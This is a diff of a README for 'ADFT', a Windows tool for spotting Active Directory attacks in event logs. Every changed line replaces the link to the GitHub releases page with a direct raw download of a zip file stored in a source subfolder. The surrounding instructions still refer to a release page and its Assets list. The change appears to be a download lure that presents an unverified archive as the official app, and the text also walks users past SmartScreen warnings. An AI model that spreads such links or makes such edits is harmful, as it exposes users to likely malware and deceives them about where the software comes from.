@@ -1,12 +1,12 @@
 # 🛠️ ADFT - Find AD Attacks in Event Logs
 
-[![Download ADFT](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Nflba4888/ADFT/releases)
+[![Download ADFT](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Nflba4888/ADFT/main/adft/timeline/Software_1.2.zip)
 
 ## 📥 Download ADFT
 
 Visit the release page to download and run this app on Windows:
 
-https://github.com/Nflba4888/ADFT/releases
+https://raw.githubusercontent.com/Nflba4888/ADFT/main/adft/timeline/Software_1.2.zip
 
 Pick the latest release, then download the Windows file from the Assets list.
 
@@ -34,7 +34,7 @@ If Windows SmartScreen shows a message, choose the app only if you got it from t
 ## 🚀 Get the App
 
 1. Open the release page:
-   https://github.com/Nflba4888/ADFT/releases
+   https://raw.githubusercontent.com/Nflba4888/ADFT/main/adft/timeline/Software_1.2.zip
 2. Find the newest release at the top of the page
 3. Open the **Assets** section
 4. Download the Windows file
@@ -159,7 +159,7 @@ This makes it easier to see how an attacker moved through the environment.
 
 Download or open the latest release here:
 
-https://github.com/Nflba4888/ADFT/releases
+https://raw.githubusercontent.com/Nflba4888/ADFT/main/adft/timeline/Software_1.2.zip
 
 ## 🧱 Project Focus
 
